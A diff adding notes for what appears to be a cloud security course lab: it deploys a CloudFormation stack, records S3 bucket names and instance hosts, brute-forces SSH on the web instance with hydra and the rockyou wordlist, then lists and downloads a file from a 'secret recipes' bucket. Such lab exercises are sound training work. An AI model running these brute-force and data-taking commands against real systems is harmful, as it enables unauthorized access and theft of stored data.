@@ -1,0 +1,31 @@
+aws cloudformation create-stack --region us-east-1 --stack-name c3-app --template-body file://starter/c3-app.yml --parameters ParameterKey=KeyPair,ParameterValue=Udacity-C3 --capabilities CAPABILITY_IAM
+
+S3 Buckets
+cand-c3-free-recipes-290133382718
+cand-c3-secret-recipes-290133382718
+
+ApplicationURL	c1-web-service-alb-2084782116.us-east-1.elb.amazonaws.com
+
+ApplicationInstanceIP	ec2-18-235-189-124.compute-1.amazonaws.com   	Web Service Instance
+AttackInstanceIP	ec2-18-207-165-219.compute-1.amazonaws.com 			Attack Instance 
+
+aws s3 cp free_recipe.txt s3://cand-c3-free-recipes-290133382718/ --region us-east-1
+aws s3 cp secret_recipe.txt s3://cand-c3-secret-recipes-290133382718/ --region us-east-1
+
+http://c1-web-service-alb-2084782116.us-east-1.elb.amazonaws.com/free_recipe
+
+
+ssh -i Udacity-C3.pem ubuntu@18.207.165.219
+ssh -i Udacity-C3.pem ubuntu@18.235.189.124
+
+hydra -l ubuntu -P rockyou.txt ssh://ec2-18-235-189-124.compute-1.amazonaws.com
+
+
+# view the files in the secret recipes bucket
+aws s3 ls  s3://cand-c3-secret-recipes-290133382718/ --region us-east-1
+
+# download the files
+aws s3 cp s3://cand-c3-secret-recipes-290133382718/secret_recipe.txt  .  --region us-east-1
+
+# view contents of the file
+cat secret_recipe.txt
